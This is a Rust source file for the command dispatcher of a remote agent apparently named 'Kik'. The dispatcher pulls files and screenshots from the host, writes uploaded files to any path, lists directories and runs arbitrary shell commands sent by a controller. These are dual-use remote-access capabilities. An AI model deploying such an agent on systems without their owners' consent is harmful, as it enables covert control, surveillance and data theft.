use crate::cmd_runner::fs::rename;
use crate::context::Context;
use crate::{cmd_util, screen};
use anyhow::anyhow;
use std::error::Error;
use std::fmt::Alignment::{Left, Right};
// use   anyhow::Context as AnyContext;
use common::command::{Command, CtrlCommand};
use common::file_util;
use common::message::dok::Dok;
use common::message::dok::Dok::FilePart;
use common::protocol::BufSerializable;
use log::debug;
use tokio::fs;
use tokio_util::either::Either;
use uuid::Uuid;
use common::message::kik_cmd_resp_info;
use common::message::kik_resp::{kik_error, kik_success_data_id, kik_success_info, KikResp};

pub async fn run(context: &Context, cmd: Command) -> KikResp {
    match cmd {
        Command::Ctrl(c) => {
            let resp = match c {
                CtrlCommand::GetFile(file_path, _) => match file_util::read_file(file_path).await {
                    Ok(v) => match context.find_and_send_data(&v).await {
                        Ok(data_id) => {
                            return kik_success_data_id(data_id);
                        }
                        Err(e) => {
                            kik_error(format!("Kik发送数据失败,error:{:?}", e))
                        }
                    },
                    Err(e) => {
                        kik_error( format!("Kik读取文件失败:{}", e))
                    }
                },
                CtrlCommand::GetBigFile(file_path, _) => {
                    match do_get_big_file(context, file_path).await {
                        Either::Left(info) => kik_success_info(info),
                        Either::Right(data_id) => return kik_success_data_id(data_id),
                    }
                }
                CtrlCommand::SetBigFile(data_id, total, hash, save_path) => {
                    match set_big_file(&context, data_id, total, hash, save_path.clone()).await {
                        Ok(_) => {
                            kik_success_info(format!("保存大文件至Kik:{}成功", save_path))
                        }
                        Err(e) => {
                            kik_success_info(format!("保存大文件至Kik:{}失败,error:{}", save_path, e))
                        }
                    }
                }
                CtrlCommand::SetFile(data_id, save_path) => {
                    //recv data
                    match context.read_data(data_id).await {
                        Ok(data) => {
                            //save_path
                            match file_util::save_file(save_path.as_str(), &data).await {
                                Ok(_) => {
                                    kik_success_info( format!("保存文件至Kik:{}成功", save_path))
                                }
                                Err(e) => {
                                    kik_error(format!("保存文件至Kik:{}失败,error:{}", save_path, e))
                                }
                            }
                        }
                        Err(e) => kik_error(format!("{}", e)),
                    }
                }
                CtrlCommand::Ls(s) => {
                    let args: Vec<&str> = s.split_ascii_whitespace().collect();
                    match (match args.as_slice() {
                        [path, arg, ..] => {
                            if *arg == "-r" {
                                file_util::ls(*path, true)
                            } else {
                                file_util::ls(*path, false)
                            }
                        }
                        _ => file_util::ls(s.as_str(), false),
                    })
                        .await.and_then(|v| {
                        Ok(
                            serde_json::to_string(&v
                                .into_iter()
                                .map(|(filename, is_file, size, created_date, modified_date)| {
                                    kik_cmd_resp_info::Ls {
                                        size,
                                        filename,
                                        is_file,
                                        created_date,
                                        modified_date,
                                    }
                                }).collect::<Vec<kik_cmd_resp_info::Ls>>())?)
                    })
                    {
                        Ok(json) => kik_success_info(json),
                        Err(e) => kik_error(e.to_string()),
                    }
                }
                CtrlCommand::Screen(_) => match screen::cut_screen().await {
                    Ok(v) => match context.find_and_send_data(&v).await {
                        Ok(data_id) => {
                            return kik_success_data_id(data_id);
                        }
                        Err(e) => {
                            kik_error(format!("Kik发送数据失败,error:{:?}", e))
                        }
                    },
                    Err(e) => {
                        kik_error(format!("Kik截屏失败,error:{:?}", e))
                    }
                },
            };
            resp
        }
        Command::Exec(s) => {
            // let v: Vec<String> = s.trim().split_whitespace().map(|x| x.to_string()).collect();

            match cmd_util::cmd_exec_line(s.as_str(), false, true)
                .await {
                Ok(res) => {
                    kik_success_info(res)
                }
                Err(e) => {
                    kik_error(format!("cmd exec error:{}", e))
                }
            }

        }
        _ => kik_error("暂不支持该类型消息".to_string()),
    }
}

async fn do_get_big_file(context: &Context, file_path: String) -> Either<String, String> {
    let file_size = file_util::get_file_size(file_path.as_str()).await;
    if let Err(e) = file_size {
        return Either::Left(format!("获取文件失败,error:{}", e));
    }
    if file_size.unwrap() > 1024 * 1024 * 1024 {
        Either::Left("暂不支持1G以上的文件".to_string())
    } else {
        match file_util::read_file(file_path).await {
            Ok(v) => match context.find_and_send_data(&v).await {
                Ok(data_id) => Either::Right(data_id),
                Err(e) => Either::Left(format!("Kik发送数据失败,error:{:?}", e)),
            },
            Err(e) => Either::Left(format!("Kik读取文件失败:{}", e)),
        }
    }
}

async fn set_big_file(
    context: &Context,
    data_id: String,
    total: u64,
    hash: Vec<u8>,
    save_path: String,
) -> anyhow::Result<()> {
    let mut sum = 0;

    let file = file_util::create_file(save_path.as_str())
        .await
        .map_err(|e| anyhow!("获取文件句柄失败,error:{}", e))?;

    let original_path = fs::canonicalize(save_path.as_str()).await?;

    let file_name = original_path
        .file_name()
        .ok_or(anyhow!("获取文件名失败"))?
        .to_string_lossy();
    // 在临时目录创建临时文件路径
    let temp_file_path = std::env::temp_dir()
        .join(&format!(
            "{}-{}.temp",
            file_name,
            Uuid::new_v4().to_string()
        ))
        .to_string_lossy()
        .to_string();

    loop {
        let data = context.read_data(data_id.clone()).await?;
        let dok = Dok::from_buf(data).ok_or(anyhow!("大文件数据格式错误!"))?;
        if let FilePart(start, end, data) = dok {
            sum += data.len() as u64;
            file_util::write_range_file(temp_file_path.as_str(), start, end, data).await?;
            if sum == total {
                file_util::set_file_size(temp_file_path.as_str(), total).await?;
                if hash.eq(&file_util::compute_hash(temp_file_path.as_str()).await?) {
                    break;
                } else {
                    return Err(anyhow!("hash校验失败，数据错误"));
                }
            } else if sum > total {
                return Err(anyhow!("获取大文件数据错误!!!"));
            }
        } else {
            return Err(anyhow!("大文件保存失败"));
        }
    }
    drop(file);
    fs::remove_file(save_path.as_str())
        .await
        .or_else(|e| {
            if e.kind() == std::io::ErrorKind::NotFound {
                return Ok(());
            }
            Err(e)
        })
        .map_err(|e| anyhow!("删除文件失败,error:{}", e))?;
    match rename(temp_file_path.as_str(), save_path.as_str()).await {
        Ok(_) => {}
        Err(_) => {
            fs::copy(&temp_file_path, &save_path)
                .await
                .map_err(|e| anyhow!("移动文件失败,error:{}", e))?;
        }
    }
    fs::remove_file(temp_file_path.as_str()).await.unwrap_or(());
    Ok(())
}
